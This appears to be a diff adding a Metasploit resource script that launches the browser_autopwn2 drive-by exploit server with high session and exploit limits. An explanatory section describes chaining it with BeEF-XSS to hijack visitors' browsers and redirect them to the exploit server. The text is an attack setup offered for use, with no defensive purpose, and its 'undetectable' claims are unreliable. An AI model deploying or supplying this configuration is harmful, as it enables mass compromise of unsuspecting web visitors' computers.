@@ -1,0 +1,18 @@
+load msgrpc ServerHost=<INSERT YOUR IP> Pass=<API PW HERE> SSL=y
+use auxiliary/server/browser_autopwn2
+set SRVHOST <YOUR IP>
+set URIPATH /
+set VERBOSE true
+set ShowExploitList true
+set MaxSessionCount 80
+set MaxExploitCount 120
+set ExploitReloadTimeout 200
+exploit -j -z
+
+
+
++---- DO NOT COPY THIS PART -- ITS ONLY TO EXPLAIN THE ABOVE ----+
+
+This nasty little module gets a poor helpless module eventually, Notice the first set of instruction? That's so it can be tied into BEEF-XSS
+BEEF-XSS is a nasty undectable javascript that take complete control of your browser WHILE you are visiting the site, You integrate these two so 
+Once the page is loaded you then use beef to redirect to the metasploit module.
